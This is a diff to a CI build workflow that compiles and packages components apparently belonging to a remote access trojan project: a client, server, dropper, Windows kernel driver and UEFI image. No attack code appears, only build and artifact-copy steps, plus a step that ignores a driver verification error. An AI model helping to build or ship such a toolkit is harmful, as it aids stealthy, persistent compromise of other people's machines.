@@ -31,13 +31,21 @@ jobs:
           extern\wdksetup.exe /features + /log "%cd%\wdksetup.log" /quiet
           cargo install cargo-wdk
 
+      - name: Build embedded client
+        run: cargo build -p rat-client --release
+
       - name: Build Windows kernel driver
         working-directory: rat-driver
-        run: cargo wdk build --profile release || true  # Ignore this because our .inx fucks up infverif
+        # Ignore wdk build error because our .inx fucks up infverif
+        run: |
+          cargo wdk build --profile release || true
+          copy target\release\rat_driver_package\* ..\target\release\rat_driver_package
 
       - name: Build UEFI image
         working-directory: rat-efi
-        run: cargo build --release
+        run: |
+          cargo build --release
+          copy target\x86_64-unknown-uefi\release\rat-efi.efi ..\target\release\rat-efi.efi
 
       - name: Build Windows executables
         run: cargo build --release
@@ -47,6 +55,8 @@ jobs:
         with:
           name: windows
           path: |
+            target/release/rat_driver_package
+            target/release/rat-efi.efi
             target/release/rat-client.exe
             target/release/rat-dropper.exe
             target/release/rat-server.exe
